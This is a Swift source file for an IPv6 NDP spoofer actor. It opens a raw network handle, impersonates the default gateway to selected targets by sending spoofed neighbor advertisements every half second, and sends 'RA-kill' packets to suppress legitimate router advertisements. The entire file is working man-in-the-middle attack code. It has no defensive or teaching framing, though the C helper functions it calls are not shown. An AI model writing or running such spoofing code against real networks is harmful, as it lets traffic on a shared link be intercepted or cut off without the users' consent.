import Foundation

/// IPv6 NDP spoofer.
/// Engages only when target has detected non-link-local IPv6 traffic.
actor NDPSpoofer {

    struct Target: Hashable {
        let ipv6: String          // global unicast
        let mac: MACAddress
    }

    private var context: NetworkContext
    private var handle: UnsafeMutableRawPointer?
    private var targets: Set<Target> = []
    private var task: Task<Void, Never>?

    init(context: NetworkContext) {
        self.context = context
    }

    /// Swap in a fresh NetworkContext (Wi-Fi switch on same iface).
    func setContext(_ ctx: NetworkContext) {
        self.context = ctx
    }

    func start(targets: [Target]) async throws {
        self.targets = Set(targets)
        if handle == nil {
            var errbuf = [CChar](repeating: 0, count: 256)
            guard let h = wm_ndp_open(context.interface, &errbuf) else {
                throw NSError(domain: "NDPSpoofer", code: 1,
                              userInfo: [NSLocalizedDescriptionKey: String(cString: errbuf)])
            }
            self.handle = h
        }
        if task == nil {
            task = Task.detached(priority: .userInitiated) { [weak self] in
                await self?.loop()
            }
        }
    }

    func update(targets: [Target]) {
        self.targets = Set(targets)
    }

    func stop() async {
        task?.cancel(); task = nil
        if let h = handle { wm_ndp_close(h); handle = nil }
        targets.removeAll()
    }

    private func loop() async {
        while !Task.isCancelled {
            await tick()
            try? await Task.sleep(nanoseconds: 500_000_000)
        }
    }

    private func tick() async {
        guard let h = handle else { return }
        let mac = context.selfMAC.bytes
        guard let ourLL = context.selfIPv6.first(where: { $0.lowercased().hasPrefix("fe80") }) else { return }

        for t in targets {
            // Spoof default router (one of gateway's v6 addrs would be ideal; for now we
            // spoof every routable v6 address belonging to gateway). Then send RA-kill.
            for gwV6 in gatewayV6Candidates() {
                _ = ourLL.withCString { ourLLcs in
                    t.ipv6.withCString { vCs in
                        gwV6.withCString { gwCs in
                            mac.withUnsafeBufferPointer { mPtr in
                                wm_ndp_send_spoof(h, mPtr.baseAddress, ourLLcs, vCs, gwCs)
                            }
                        }
                    }
                }
            }

            _ = ourLL.withCString { ourLLcs in
                t.ipv6.withCString { vCs in
                    mac.withUnsafeBufferPointer { mPtr in
                        wm_ndp_send_ra_kill(h, mPtr.baseAddress, ourLLcs, vCs)
                    }
                }
            }
        }
    }

    /// Best-effort: pull the v6 default router from `netstat -rn -f inet6`.
    private func gatewayV6Candidates() -> [String] {
        let out = Sysinfo.runShell(["/usr/sbin/netstat", "-rn", "-f", "inet6"])
        var routers: [String] = []
        for line in out.components(separatedBy: "\n") {
            let parts = line.split(separator: " ", omittingEmptySubsequences: true)
            guard parts.count >= 2 else { continue }
            if parts[0] == "default" {
                let gw = String(parts[1]).components(separatedBy: "%").first ?? ""
                if !gw.isEmpty { routers.append(gw) }
            }
        }
        return routers
    }
}
